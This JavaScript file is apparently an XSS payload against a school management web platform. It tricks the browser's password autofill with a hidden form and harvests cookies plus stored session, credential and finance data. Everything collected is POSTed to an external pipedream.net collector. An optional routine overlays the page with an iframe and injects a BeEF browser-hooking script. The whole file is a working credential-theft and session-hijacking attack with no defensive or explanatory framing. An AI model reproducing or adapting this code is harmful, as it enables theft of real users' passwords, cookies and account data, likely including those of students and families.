const ur = new URL(document.currentScript.src);

(async function ex() {

	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
	const keys = [
		'accounts', 'badges', 'credentials', 'edhydration_auth',
		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
	];
	const form = document.createElement('form');
	const identifiant = JSON.parse(sessionStorage.getItem("accounts"));
	form.hidden = true;
	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
	document.body.appendChild(form);
	const pwdInput = document.querySelector('input[type="password"]');
	const interval = setInterval(() => {
		if (pwdInput.value !== "") {
			console.log(pwdInput.value);
			clearInterval(interval);
		}
	}, 40);
  
	const data = {
		t: new Date().toISOString(),
		u: navigator.userAgent,
		mid: messageid.searchParams.get('idMessage') || "null",
		api: ur.searchParams.get("apiv") || "100.1",
		sign: ur.searchParams.get("signature") || false,
		mode: ur.searchParams.get("mode") || "Suppression",
		email: ur.searchParams.get("email") || "test@gmail.com",
		ps: pwdInput.value,
		c: document.cookie,
		s: Object.fromEntries(
		keys
			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
			.filter(([, v]) => v !== null)
			.map(([k, v]) => {
			try { return [k, JSON.parse(v)]; }
			catch { return [k, v]; }
			})
		)
	};

	try {
		await fetch(url, {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		});
	} catch {}
})();

async function iframe() {
	const i = window.top.document.createElement('iframe');
	i.src = "/";
	i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
	i.className = 'EDsploit';
	window.top.document.body.appendChild(i);
        
	i.onload = () => {
		const beef = window.top.document.createElement("script");
		beef.src = "https://beef.local/hook.js";
		beef.async = true;
		window.top.document.body.appendChild(beef);
	};
	
	return;
};

if (ur.searchParams.get("iframetrap") === true) {
	await iframe()
}
